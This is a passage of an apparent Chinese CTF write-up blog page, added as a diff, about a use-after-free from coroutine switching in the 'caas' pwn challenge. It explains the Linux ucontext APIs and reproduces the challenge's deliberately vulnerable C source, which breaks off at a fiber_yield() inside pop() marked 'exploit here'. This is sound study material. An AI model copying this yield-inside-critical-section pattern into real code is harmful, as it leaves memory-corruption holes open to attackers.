@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>协程切换的临界区块控制不当而引发的UAF血案</title>
+  <meta name="description" content="0x00 前言">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/jekyll/update/2019/01/02/caas.html">
+  <link rel="alternate" type="application/rss+xml" title="Your awesome title" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Your awesome title</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">协程切换的临界区块控制不当而引发的UAF血案</h1>
+    <p class="post-meta"><time datetime="2019-01-02T00:44:51+08:00" itemprop="datePublished">Jan 2, 2019</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h2 id="0x00">0x00 前言</h2>
+
+<p>首先祝大家新年快乐，最近做了一道pwn题，挺有意思的，是利用协程切换时临界区控制不当而导致的UAF，这题做了我很久，两天多。（可能是因为我菜）所以感觉很有收获，写这个不仅是分享，也是把我自己做题的心路历程记录下来，总结经验。</p>
+
+<h2 id="0x01-linux">0x01 linux协程基础</h2>
+
+<p>协程，简单的说，就是用户态的，程序自己所控制的线程。我们知道，线程的管理与调度，一般是操作系统所控制的，但是协程，是用户自己所控制的。在操作系统看来，无论你建立了多少个协程，都只把它看作是一个线程。</p>
+
+<h3 id="ucontext_t">ucontext_t结构体</h3>
+
+<p>一个linux帮我们定义好的结构体，记录了一个协程的状态，比如寄存器信息，等等。。。</p>
+
+<h3 id="linux-4-api">linux的协程，有4个API:</h3>
+
+<ol>
+<li>getcontext，把执行完这个call后理论上应该有的状态，以及协程的信息，记录到ucontext_t结构体</li>
+<li>setcontext，把当前记录在ucontext_t的数据，加载到当前状态中</li>
+<li>makecontext，将这个ucontext_t中的eip设置为给定数值，并且给上指定参数，调用这个函数前，必须要先getcontext初始化ucontext_t。这个函数其实就是用来初始化协程用的，一般就是会给个函数指针作为初始eip。这个就好比创建线程时给的那个线程函数的函数指针。</li>
+<li>swapcontext，用于协程切换，会把当前状态存入第一个ucontext_t，并且加载第二个ucontext_t到当前状态。</li>
+</ol>
+
+<p>linux协程的具体内容我不会细讲了。。毕竟这是一道pwn的writeup不是linux协程开发教程。。。上面只是大概地说了一下。。。详细内容可以看看 linux的man <a href="http://man7.org">http://man7.org</a> 或者<a href="https://segmentfault.com/p/1210000009166339/read#2-1-_getcontext_u5B9E_u73B0">https://segmentfault.com/p/1210000009166339/read#2-1-<em>getcontext_u5B9E</em>u73B0</a> </p>
+
+<h2 id="0x02-caas-pwn">0x02 caas pwn</h2>
+
+<p>这道pwn是开源的，以下是源代码</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdint.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;ucontext.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;unistd.h&gt;
+</span>
+<span class="c1">// CRC 
+</span>
+<span class="k">static</span> <span class="kt">uint32_t</span> <span class="n">crc32_tab</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x77073096</span><span class="p">,</span> <span class="mh">0xee0e612c</span><span class="p">,</span> <span class="mh">0x990951ba</span><span class="p">,</span> <span class="mh">0x076dc419</span><span class="p">,</span> <span class="mh">0x706af48f</span><span class="p">,</span>
+  <span class="mh">0xe963a535</span><span class="p">,</span> <span class="mh">0x9e6495a3</span><span class="p">,</span> <span class="mh">0x0edb8832</span><span class="p">,</span> <span class="mh">0x79dcb8a4</span><span class="p">,</span> <span class="mh">0xe0d5e91e</span><span class="p">,</span> <span class="mh">0x97d2d988</span><span class="p">,</span>
+  <span class="mh">0x09b64c2b</span><span class="p">,</span> <span class="mh">0x7eb17cbd</span><span class="p">,</span> <span class="mh">0xe7b82d07</span><span class="p">,</span> <span class="mh">0x90bf1d91</span><span class="p">,</span> <span class="mh">0x1db71064</span><span class="p">,</span> <span class="mh">0x6ab020f2</span><span class="p">,</span>
+  <span class="mh">0xf3b97148</span><span class="p">,</span> <span class="mh">0x84be41de</span><span class="p">,</span> <span class="mh">0x1adad47d</span><span class="p">,</span> <span class="mh">0x6ddde4eb</span><span class="p">,</span> <span class="mh">0xf4d4b551</span><span class="p">,</span> <span class="mh">0x83d385c7</span><span class="p">,</span>
+  <span class="mh">0x136c9856</span><span class="p">,</span> <span class="mh">0x646ba8c0</span><span class="p">,</span> <span class="mh">0xfd62f97a</span><span class="p">,</span> <span class="mh">0x8a65c9ec</span><span class="p">,</span> <span class="mh">0x14015c4f</span><span class="p">,</span> <span class="mh">0x63066cd9</span><span class="p">,</span>
+  <span class="mh">0xfa0f3d63</span><span class="p">,</span> <span class="mh">0x8d080df5</span><span class="p">,</span> <span class="mh">0x3b6e20c8</span><span class="p">,</span> <span class="mh">0x4c69105e</span><span class="p">,</span> <span class="mh">0xd56041e4</span><span class="p">,</span> <span class="mh">0xa2677172</span><span class="p">,</span>
+  <span class="mh">0x3c03e4d1</span><span class="p">,</span> <span class="mh">0x4b04d447</span><span class="p">,</span> <span class="mh">0xd20d85fd</span><span class="p">,</span> <span class="mh">0xa50ab56b</span><span class="p">,</span> <span class="mh">0x35b5a8fa</span><span class="p">,</span> <span class="mh">0x42b2986c</span><span class="p">,</span>
+  <span class="mh">0xdbbbc9d6</span><span class="p">,</span> <span class="mh">0xacbcf940</span><span class="p">,</span> <span class="mh">0x32d86ce3</span><span class="p">,</span> <span class="mh">0x45df5c75</span><span class="p">,</span> <span class="mh">0xdcd60dcf</span><span class="p">,</span> <span class="mh">0xabd13d59</span><span class="p">,</span>
+  <span class="mh">0x26d930ac</span><span class="p">,</span> <span class="mh">0x51de003a</span><span class="p">,</span> <span class="mh">0xc8d75180</span><span class="p">,</span> <span class="mh">0xbfd06116</span><span class="p">,</span> <span class="mh">0x21b4f4b5</span><span class="p">,</span> <span class="mh">0x56b3c423</span><span class="p">,</span>
+  <span class="mh">0xcfba9599</span><span class="p">,</span> <span class="mh">0xb8bda50f</span><span class="p">,</span> <span class="mh">0x2802b89e</span><span class="p">,</span> <span class="mh">0x5f058808</span><span class="p">,</span> <span class="mh">0xc60cd9b2</span><span class="p">,</span> <span class="mh">0xb10be924</span><span class="p">,</span>
+  <span class="mh">0x2f6f7c87</span><span class="p">,</span> <span class="mh">0x58684c11</span><span class="p">,</span> <span class="mh">0xc1611dab</span><span class="p">,</span> <span class="mh">0xb6662d3d</span><span class="p">,</span> <span class="mh">0x76dc4190</span><span class="p">,</span> <span class="mh">0x01db7106</span><span class="p">,</span>
+  <span class="mh">0x98d220bc</span><span class="p">,</span> <span class="mh">0xefd5102a</span><span class="p">,</span> <span class="mh">0x71b18589</span><span class="p">,</span> <span class="mh">0x06b6b51f</span><span class="p">,</span> <span class="mh">0x9fbfe4a5</span><span class="p">,</span> <span class="mh">0xe8b8d433</span><span class="p">,</span>
+  <span class="mh">0x7807c9a2</span><span class="p">,</span> <span class="mh">0x0f00f934</span><span class="p">,</span> <span class="mh">0x9609a88e</span><span class="p">,</span> <span class="mh">0xe10e9818</span><span class="p">,</span> <span class="mh">0x7f6a0dbb</span><span class="p">,</span> <span class="mh">0x086d3d2d</span><span class="p">,</span>
+  <span class="mh">0x91646c97</span><span class="p">,</span> <span class="mh">0xe6635c01</span><span class="p">,</span> <span class="mh">0x6b6b51f4</span><span class="p">,</span> <span class="mh">0x1c6c6162</span><span class="p">,</span> <span class="mh">0x856530d8</span><span class="p">,</span> <span class="mh">0xf262004e</span><span class="p">,</span>
+  <span class="mh">0x6c0695ed</span><span class="p">,</span> <span class="mh">0x1b01a57b</span><span class="p">,</span> <span class="mh">0x8208f4c1</span><span class="p">,</span> <span class="mh">0xf50fc457</span><span class="p">,</span> <span class="mh">0x65b0d9c6</span><span class="p">,</span> <span class="mh">0x12b7e950</span><span class="p">,</span>
+  <span class="mh">0x8bbeb8ea</span><span class="p">,</span> <span class="mh">0xfcb9887c</span><span class="p">,</span> <span class="mh">0x62dd1ddf</span><span class="p">,</span> <span class="mh">0x15da2d49</span><span class="p">,</span> <span class="mh">0x8cd37cf3</span><span class="p">,</span> <span class="mh">0xfbd44c65</span><span class="p">,</span>
+  <span class="mh">0x4db26158</span><span class="p">,</span> <span class="mh">0x3ab551ce</span><span class="p">,</span> <span class="mh">0xa3bc0074</span><span class="p">,</span> <span class="mh">0xd4bb30e2</span><span class="p">,</span> <span class="mh">0x4adfa541</span><span class="p">,</span> <span class="mh">0x3dd895d7</span><span class="p">,</span>
+  <span class="mh">0xa4d1c46d</span><span class="p">,</span> <span class="mh">0xd3d6f4fb</span><span class="p">,</span> <span class="mh">0x4369e96a</span><span class="p">,</span> <span class="mh">0x346ed9fc</span><span class="p">,</span> <span class="mh">0xad678846</span><span class="p">,</span> <span class="mh">0xda60b8d0</span><span class="p">,</span>
+  <span class="mh">0x44042d73</span><span class="p">,</span> <span class="mh">0x33031de5</span><span class="p">,</span> <span class="mh">0xaa0a4c5f</span><span class="p">,</span> <span class="mh">0xdd0d7cc9</span><span class="p">,</span> <span class="mh">0x5005713c</span><span class="p">,</span> <span class="mh">0x270241aa</span><span class="p">,</span>
+  <span class="mh">0xbe0b1010</span><span class="p">,</span> <span class="mh">0xc90c2086</span><span class="p">,</span> <span class="mh">0x5768b525</span><span class="p">,</span> <span class="mh">0x206f85b3</span><span class="p">,</span> <span class="mh">0xb966d409</span><span class="p">,</span> <span class="mh">0xce61e49f</span><span class="p">,</span>
+  <span class="mh">0x5edef90e</span><span class="p">,</span> <span class="mh">0x29d9c998</span><span class="p">,</span> <span class="mh">0xb0d09822</span><span class="p">,</span> <span class="mh">0xc7d7a8b4</span><span class="p">,</span> <span class="mh">0x59b33d17</span><span class="p">,</span> <span class="mh">0x2eb40d81</span><span class="p">,</span>
+  <span class="mh">0xb7bd5c3b</span><span class="p">,</span> <span class="mh">0xc0ba6cad</span><span class="p">,</span> <span class="mh">0xedb88320</span><span class="p">,</span> <span class="mh">0x9abfb3b6</span><span class="p">,</span> <span class="mh">0x03b6e20c</span><span class="p">,</span> <span class="mh">0x74b1d29a</span><span class="p">,</span>
+  <span class="mh">0xead54739</span><span class="p">,</span> <span class="mh">0x9dd277af</span><span class="p">,</span> <span class="mh">0x04db2615</span><span class="p">,</span> <span class="mh">0x73dc1683</span><span class="p">,</span> <span class="mh">0xe3630b12</span><span class="p">,</span> <span class="mh">0x94643b84</span><span class="p">,</span>
+  <span class="mh">0x0d6d6a3e</span><span class="p">,</span> <span class="mh">0x7a6a5aa8</span><span class="p">,</span> <span class="mh">0xe40ecf0b</span><span class="p">,</span> <span class="mh">0x9309ff9d</span><span class="p">,</span> <span class="mh">0x0a00ae27</span><span class="p">,</span> <span class="mh">0x7d079eb1</span><span class="p">,</span>
+  <span class="mh">0xf00f9344</span><span class="p">,</span> <span class="mh">0x8708a3d2</span><span class="p">,</span> <span class="mh">0x1e01f268</span><span class="p">,</span> <span class="mh">0x6906c2fe</span><span class="p">,</span> <span class="mh">0xf762575d</span><span class="p">,</span> <span class="mh">0x806567cb</span><span class="p">,</span>
+  <span class="mh">0x196c3671</span><span class="p">,</span> <span class="mh">0x6e6b06e7</span><span class="p">,</span> <span class="mh">0xfed41b76</span><span class="p">,</span> <span class="mh">0x89d32be0</span><span class="p">,</span> <span class="mh">0x10da7a5a</span><span class="p">,</span> <span class="mh">0x67dd4acc</span><span class="p">,</span>
+  <span class="mh">0xf9b9df6f</span><span class="p">,</span> <span class="mh">0x8ebeeff9</span><span class="p">,</span> <span class="mh">0x17b7be43</span><span class="p">,</span> <span class="mh">0x60b08ed5</span><span class="p">,</span> <span class="mh">0xd6d6a3e8</span><span class="p">,</span> <span class="mh">0xa1d1937e</span><span class="p">,</span>
+  <span class="mh">0x38d8c2c4</span><span class="p">,</span> <span class="mh">0x4fdff252</span><span class="p">,</span> <span class="mh">0xd1bb67f1</span><span class="p">,</span> <span class="mh">0xa6bc5767</span><span class="p">,</span> <span class="mh">0x3fb506dd</span><span class="p">,</span> <span class="mh">0x48b2364b</span><span class="p">,</span>
+  <span class="mh">0xd80d2bda</span><span class="p">,</span> <span class="mh">0xaf0a1b4c</span><span class="p">,</span> <span class="mh">0x36034af6</span><span class="p">,</span> <span class="mh">0x41047a60</span><span class="p">,</span> <span class="mh">0xdf60efc3</span><span class="p">,</span> <span class="mh">0xa867df55</span><span class="p">,</span>
+  <span class="mh">0x316e8eef</span><span class="p">,</span> <span class="mh">0x4669be79</span><span class="p">,</span> <span class="mh">0xcb61b38c</span><span class="p">,</span> <span class="mh">0xbc66831a</span><span class="p">,</span> <span class="mh">0x256fd2a0</span><span class="p">,</span> <span class="mh">0x5268e236</span><span class="p">,</span>
+  <span class="mh">0xcc0c7795</span><span class="p">,</span> <span class="mh">0xbb0b4703</span><span class="p">,</span> <span class="mh">0x220216b9</span><span class="p">,</span> <span class="mh">0x5505262f</span><span class="p">,</span> <span class="mh">0xc5ba3bbe</span><span class="p">,</span> <span class="mh">0xb2bd0b28</span><span class="p">,</span>
+  <span class="mh">0x2bb45a92</span><span class="p">,</span> <span class="mh">0x5cb36a04</span><span class="p">,</span> <span class="mh">0xc2d7ffa7</span><span class="p">,</span> <span class="mh">0xb5d0cf31</span><span class="p">,</span> <span class="mh">0x2cd99e8b</span><span class="p">,</span> <span class="mh">0x5bdeae1d</span><span class="p">,</span>
+  <span class="mh">0x9b64c2b0</span><span class="p">,</span> <span class="mh">0xec63f226</span><span class="p">,</span> <span class="mh">0x756aa39c</span><span class="p">,</span> <span class="mh">0x026d930a</span><span class="p">,</span> <span class="mh">0x9c0906a9</span><span class="p">,</span> <span class="mh">0xeb0e363f</span><span class="p">,</span>
+  <span class="mh">0x72076785</span><span class="p">,</span> <span class="mh">0x05005713</span><span class="p">,</span> <span class="mh">0x95bf4a82</span><span class="p">,</span> <span class="mh">0xe2b87a14</span><span class="p">,</span> <span class="mh">0x7bb12bae</span><span class="p">,</span> <span class="mh">0x0cb61b38</span><span class="p">,</span>
+  <span class="mh">0x92d28e9b</span><span class="p">,</span> <span class="mh">0xe5d5be0d</span><span class="p">,</span> <span class="mh">0x7cdcefb7</span><span class="p">,</span> <span class="mh">0x0bdbdf21</span><span class="p">,</span> <span class="mh">0x86d3d2d4</span><span class="p">,</span> <span class="mh">0xf1d4e242</span><span class="p">,</span>
+  <span class="mh">0x68ddb3f8</span><span class="p">,</span> <span class="mh">0x1fda836e</span><span class="p">,</span> <span class="mh">0x81be16cd</span><span class="p">,</span> <span class="mh">0xf6b9265b</span><span class="p">,</span> <span class="mh">0x6fb077e1</span><span class="p">,</span> <span class="mh">0x18b74777</span><span class="p">,</span>
+  <span class="mh">0x88085ae6</span><span class="p">,</span> <span class="mh">0xff0f6a70</span><span class="p">,</span> <span class="mh">0x66063bca</span><span class="p">,</span> <span class="mh">0x11010b5c</span><span class="p">,</span> <span class="mh">0x8f659eff</span><span class="p">,</span> <span class="mh">0xf862ae69</span><span class="p">,</span>
+  <span class="mh">0x616bffd3</span><span class="p">,</span> <span class="mh">0x166ccf45</span><span class="p">,</span> <span class="mh">0xa00ae278</span><span class="p">,</span> <span class="mh">0xd70dd2ee</span><span class="p">,</span> <span class="mh">0x4e048354</span><span class="p">,</span> <span class="mh">0x3903b3c2</span><span class="p">,</span>
+  <span class="mh">0xa7672661</span><span class="p">,</span> <span class="mh">0xd06016f7</span><span class="p">,</span> <span class="mh">0x4969474d</span><span class="p">,</span> <span class="mh">0x3e6e77db</span><span class="p">,</span> <span class="mh">0xaed16a4a</span><span class="p">,</span> <span class="mh">0xd9d65adc</span><span class="p">,</span>
+  <span class="mh">0x40df0b66</span><span class="p">,</span> <span class="mh">0x37d83bf0</span><span class="p">,</span> <span class="mh">0xa9bcae53</span><span class="p">,</span> <span class="mh">0xdebb9ec5</span><span class="p">,</span> <span class="mh">0x47b2cf7f</span><span class="p">,</span> <span class="mh">0x30b5ffe9</span><span class="p">,</span>
+  <span class="mh">0xbdbdf21c</span><span class="p">,</span> <span class="mh">0xcabac28a</span><span class="p">,</span> <span class="mh">0x53b39330</span><span class="p">,</span> <span class="mh">0x24b4a3a6</span><span class="p">,</span> <span class="mh">0xbad03605</span><span class="p">,</span> <span class="mh">0xcdd70693</span><span class="p">,</span>
+  <span class="mh">0x54de5729</span><span class="p">,</span> <span class="mh">0x23d967bf</span><span class="p">,</span> <span class="mh">0xb3667a2e</span><span class="p">,</span> <span class="mh">0xc4614ab8</span><span class="p">,</span> <span class="mh">0x5d681b02</span><span class="p">,</span> <span class="mh">0x2a6f2b94</span><span class="p">,</span>
+  <span class="mh">0xb40bbe37</span><span class="p">,</span> <span class="mh">0xc30c8ea1</span><span class="p">,</span> <span class="mh">0x5a05df1b</span><span class="p">,</span> <span class="mh">0x2d02ef8d</span>
+<span class="p">};</span>
+
+<span class="kt">uint32_t</span> <span class="nf">crc32</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">crc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
+
+  <span class="n">p</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+  <span class="n">crc</span> <span class="o">=</span> <span class="n">crc</span> <span class="o">^</span> <span class="o">~</span><span class="mi">0U</span><span class="p">;</span>
+
+  <span class="k">while</span> <span class="p">(</span><span class="n">size</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">crc</span> <span class="o">=</span> <span class="n">crc32_tab</span><span class="p">[(</span><span class="n">crc</span> <span class="o">^</span> <span class="o">*</span><span class="n">p</span><span class="o">++</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">crc</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">return</span> <span class="n">crc</span> <span class="o">^</span> <span class="o">~</span><span class="mi">0U</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Fiber
+</span>
+<span class="k">static</span> <span class="n">ucontext_t</span> <span class="o">*</span><span class="n">g_fib</span><span class="p">;</span>
+<span class="k">static</span> <span class="n">ucontext_t</span> <span class="o">*</span><span class="n">g_active_fibs</span><span class="p">;</span>
+<span class="k">static</span> <span class="n">ucontext_t</span> <span class="o">*</span><span class="n">g_unactive_fibs</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">fiber_init</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">ucontext_t</span> <span class="o">*</span><span class="n">fib</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">ucontext_t</span><span class="p">));</span>
+  <span class="n">getcontext</span><span class="p">(</span><span class="n">fib</span><span class="p">);</span>
+  <span class="n">fib</span><span class="o">-&gt;</span><span class="n">uc_link</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">g_fib</span> <span class="o">=</span> <span class="n">fib</span><span class="p">;</span>
+  <span class="n">g_active_fibs</span> <span class="o">=</span> <span class="n">fib</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">fiber_yield</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">ucontext_t</span> <span class="o">*</span><span class="n">next</span> <span class="o">=</span> <span class="n">g_fib</span><span class="o">-&gt;</span><span class="n">uc_link</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">next</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="n">next</span> <span class="o">=</span> <span class="n">g_active_fibs</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">next</span> <span class="o">==</span> <span class="n">g_fib</span><span class="p">)</span>
+    <span class="k">return</span><span class="p">;</span>
+
+  <span class="n">ucontext_t</span> <span class="o">*</span><span class="n">current_context</span> <span class="o">=</span> <span class="n">g_fib</span><span class="p">;</span>
+  <span class="n">g_fib</span> <span class="o">=</span> <span class="n">next</span><span class="p">;</span>
+  <span class="n">swapcontext</span><span class="p">(</span><span class="n">current_context</span><span class="p">,</span> <span class="n">g_fib</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">__fiber_new</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">f</span><span class="p">)())</span> <span class="p">{</span>
+  <span class="n">f</span><span class="p">();</span>
+  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">fiber_yield</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">fiber_new</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)())</span> <span class="p">{</span>
+  <span class="n">ucontext_t</span> <span class="o">*</span><span class="n">fib</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">ucontext_t</span><span class="p">));</span>
+  <span class="n">getcontext</span><span class="p">(</span><span class="n">fib</span><span class="p">);</span>
+
+  <span class="n">fib</span><span class="o">-&gt;</span><span class="n">uc_stack</span><span class="p">.</span><span class="n">ss_sp</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x8000</span><span class="p">);</span>
+  <span class="n">fib</span><span class="o">-&gt;</span><span class="n">uc_stack</span><span class="p">.</span><span class="n">ss_size</span> <span class="o">=</span> <span class="mh">0x8000</span><span class="p">;</span>
+
+  <span class="n">makecontext</span><span class="p">(</span><span class="n">fib</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">__fiber_new</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">func</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Starting Worker #%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span><span class="p">)</span><span class="n">fib</span><span class="p">);</span>
+  <span class="n">fib</span><span class="o">-&gt;</span><span class="n">uc_link</span> <span class="o">=</span> <span class="n">g_active_fibs</span><span class="p">;</span>
+  <span class="n">g_active_fibs</span> <span class="o">=</span> <span class="n">fib</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">fiber_toggle</span><span class="p">(</span><span class="n">ucontext_t</span> <span class="o">*</span><span class="n">moving</span><span class="p">,</span> <span class="n">ucontext_t</span> <span class="o">**</span><span class="n">from</span><span class="p">,</span> <span class="n">ucontext_t</span> <span class="o">**</span><span class="n">to</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">ucontext_t</span> <span class="o">*</span><span class="n">fib</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="p">;</span>
+  <span class="n">ucontext_t</span> <span class="o">*</span><span class="n">last</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+  <span class="k">while</span><span class="p">(</span><span class="n">fib</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">fib</span> <span class="o">!=</span> <span class="n">moving</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">last</span> <span class="o">=</span> <span class="n">fib</span><span class="p">;</span>
+    <span class="n">fib</span> <span class="o">=</span> <span class="n">fib</span><span class="o">-&gt;</span><span class="n">uc_link</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">fib</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="n">last</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="o">*</span><span class="n">from</span> <span class="o">=</span> <span class="n">fib</span><span class="o">-&gt;</span><span class="n">uc_link</span><span class="p">;</span>
+  <span class="k">else</span>
+    <span class="n">last</span><span class="o">-&gt;</span><span class="n">uc_link</span> <span class="o">=</span> <span class="n">moving</span><span class="o">-&gt;</span><span class="n">uc_link</span><span class="p">;</span><span class="c1">//unlink
+</span>
+  <span class="n">moving</span><span class="o">-&gt;</span><span class="n">uc_link</span> <span class="o">=</span> <span class="o">*</span><span class="n">to</span><span class="p">;</span><span class="c1">//insert to other queue
+</span>  <span class="o">*</span><span class="n">to</span> <span class="o">=</span> <span class="n">moving</span><span class="p">;</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">fiber_pause</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">id</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="n">fiber_toggle</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">g_active_fibs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">g_unactive_fibs</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">fiber_resume</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">id</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="n">fiber_toggle</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">g_unactive_fibs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">g_active_fibs</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Lock free stack
+</span><span class="k">struct</span> <span class="n">node</span> <span class="p">{</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">entry</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">node</span><span class="o">*</span> <span class="n">next</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">struct</span> <span class="n">node</span><span class="o">*</span> <span class="n">job_stack</span><span class="p">;</span>
+<span class="k">struct</span> <span class="n">node</span><span class="o">*</span> <span class="n">result_stack</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="n">push</span><span class="p">(</span><span class="k">struct</span> <span class="n">node</span> <span class="o">**</span><span class="n">stack</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">e</span><span class="p">){</span>
+  <span class="k">struct</span> <span class="n">node</span><span class="o">*</span> <span class="n">n</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">node</span><span class="p">));</span>
+  <span class="n">n</span><span class="o">-&gt;</span><span class="n">entry</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
+  <span class="n">n</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="o">*</span><span class="n">stack</span><span class="p">;</span>
+  <span class="o">*</span><span class="n">stack</span> <span class="o">=</span> <span class="n">n</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="o">*</span> <span class="n">pop</span><span class="p">(</span><span class="k">struct</span> <span class="n">node</span> <span class="o">**</span><span class="n">stack</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">struct</span> <span class="n">node</span> <span class="o">*</span><span class="n">old_head</span><span class="p">,</span> <span class="o">*</span><span class="n">new_head</span><span class="p">;</span>
+  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">old_head</span> <span class="o">=</span> <span class="o">*</span><span class="n">stack</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">old_head</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
+      <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span><span class="c1">//empty stack case
+</span>    <span class="p">}</span>
+    <span class="n">new_head</span> <span class="o">=</span> <span class="n">old_head</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+    <span class="n">fiber_yield</span><span class="p">();</span><span class="c1">//exploit here
